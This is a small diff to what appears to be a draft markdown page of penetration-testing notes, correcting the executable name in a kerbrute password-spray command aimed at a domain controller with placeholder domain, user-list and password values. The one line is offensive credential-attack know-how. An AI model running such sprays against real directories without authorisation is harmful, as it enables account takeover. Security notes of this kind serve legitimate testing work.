@@ -6,6 +6,6 @@ draft: true
 
 #### Password spray with kerbrute
 
-```$ .\kerb.exe passwordspray --dc V-DC2 -d DOMAIN.LOCAL -o spray.txt users.txt 'PASSWORD'```
+```$ .\kerbrute.exe passwordspray --dc V-DC2 -d DOMAIN.LOCAL -o spray.txt users.txt 'PASSWORD'```
 
 
